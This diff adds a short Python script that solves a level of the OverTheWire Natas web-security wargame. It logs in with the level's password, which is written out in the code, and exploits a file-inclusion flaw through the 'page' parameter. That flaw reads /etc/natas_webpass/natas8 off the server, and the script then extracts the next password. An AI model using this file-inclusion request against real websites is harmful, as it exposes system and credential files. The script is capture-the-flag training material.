@@ -1,0 +1,14 @@
+import requests
+from requests.auth import HTTPBasicAuth
+import re
+
+username = "natas7"
+password = "msnyibfdkn3a2k850pRW4MZ2jlOq7c7Y"
+base_url = "http://natas7.natas.labs.overthewire.org/"
+
+session = requests.Session()
+res = session.get(base_url + "index.php?page=/etc/natas_webpass/natas8", auth=HTTPBasicAuth(username, password))
+
+pw_match = re.search(r"[a-zA-Z0-9]{32}", res.text)
+if pw_match:
+    print(pw_match.group(0))
